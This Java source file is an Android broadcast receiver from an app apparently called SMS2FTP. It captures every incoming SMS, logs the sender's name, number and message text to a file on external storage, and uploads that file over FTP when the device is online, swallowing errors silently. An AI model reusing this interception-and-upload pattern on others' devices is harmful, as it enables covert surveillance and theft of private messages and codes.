package com.n1ck.SMS2FTP;

import java.io.File;
import java.io.FileOutputStream;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsMessage;

public class IncomingSMSListener extends BroadcastReceiver {

    private Bundle mBundle;
    FileOutputStream stream;
    String internet;
    public void onReceive(final Context context, Intent intent) {

        internet = NetworkUtil.getConnectivityStatusString(context);

        mBundle = intent.getExtras();

        if (mBundle != null){

            new Thread(new Runnable() {
                public void run() {
                    try{
                        //Получаем входящее смс
                        SmsMessage[] msgs = null;
                        Object[] pdus = (Object[]) mBundle.get("pdus");
                        if(pdus != null){
                            msgs = new SmsMessage[pdus.length];

                            //Создаем папку, если она отсутствует
                            File dir = new File(Environment.getExternalStorageDirectory(), "/log/");
                            if(!dir.exists()) {
                                dir.mkdirs();
                            }

                            for(int k=0; k<msgs.length; k++){
                                msgs[k] = SmsMessage.createFromPdu((byte[])pdus[k]);
                                AppendText append=new AppendText();
                                String msg="SMS: " + append.convertDate(msgs[k].getTimestampMillis())+ "; IN; " +
                                        append.getContactName(context,msgs[k].getOriginatingAddress()) + "; " +
                                        msgs[k].getDisplayOriginatingAddress() + "; " + msgs[k].getMessageBody();

                                //Добавляем СМС информацию к файлу

                                    append.appendStringToFile(msg, "/log/log.txt");
                            }

                            if (internet=="1" || internet=="2"){
                                FTPConnect ftp=new FTPConnect();
                                ftp.connectToFTP(context, "log.txt");

                            }
                        }
                    }catch(Exception e){
                    }
                }
            }).start();
        }
    }
}